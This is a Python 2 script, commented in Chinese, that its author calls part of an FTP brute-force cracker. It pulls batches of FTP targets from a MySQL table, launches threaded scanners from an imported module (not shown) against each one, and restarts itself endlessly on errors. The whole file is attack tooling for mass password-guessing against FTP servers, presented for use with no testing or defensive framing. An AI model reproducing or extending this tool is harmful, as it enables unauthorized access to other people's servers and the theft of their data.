#!/usr/local/bin/python
#-*- coding: UTF-8 -*-
####################################################################
#qq:316118740
#BLOG:http://hi.baidu.com/alalmn
# python FTP暴力破解部分代码
#  刚学写的不好请大家见谅
####################################################################
import mysql #数据库操作文件
import time #获取时间和延时
from ftplib import FTP    #FTP操作
import atexit  #用于文件重启
import sys
import os
####################################################################
import urllib2
def sql_sel(): #SQL查询
    try:
        try:   #检测网络连接状态
            urllib2.urlopen(r"http://www.163.com",timeout=10)
            #print u"网络连接成功"
            #return 1
        except:
            print u"网络无连接 重启程序自身"
            atexit.register(close)#自动重启本程序

        mysql.mysql_open()  #连接数据库
        sql="select * from ftp where ftpsend is NULL limit 30"
        mysql.cursor.execute(sql)
        mysql.cursor.scroll(0)
        for row in mysql.cursor.fetchall():
            cond = threading.Event()
            hider1 = CLINKFTP.PythonFtpScanner(cond,row[0])
            hider1.start()
            #print row[0]
            #time.sleep(1)  #延时
    except:
        print u"读取URL异常！！！！！"
        time.sleep(3)  #延时
        sql_sel() #SQL查询
        #print u"3秒后,程序将结束重启..."
        #mysql.mysql_S()  #保存数据
        #mysql.mysql_close()  #关闭数据库
        #atexit.register(close)#自动重启本程序

def close():  #自动重启本程序
    try:
        time.sleep(3)
        python = sys.executable
        os.execl(python, python, * sys.argv)
        #########
    except:
        sys.exit(0)  #结束进程
####################################################################
import CLINKFTP  #线程破解FTP
import sys
import socket
socket.setdefaulttimeout(10)  #设置了全局默认超时时间ftp_cracker = PythonFtpScanner()  #初始化类
import threading
import random  #产生一个随机数

if __name__=='__main__':
    try:
        mysql.mysql_open()  #连接数据库
#        sql_sel() #SQL查询
#        while    True:
#            print u"\n=======================SQL查询======================="
#            sql_sel() #SQL查询
#            time.sleep(1000)

        print u"\n=======================开始破解======================="
        while True:
            sql_sel() #SQL查询
            time.sleep(1000)  #延时
#        for i in range(10):
#            cond = threading.Event()
#            hider1 = CLINKFTP.PythonFtpScanner(cond,"")
#            hider1.start()
#            time.sleep(1)  #延时
    except:
        time.sleep(10)  #延时
        atexit.register(close)#自动重启本程序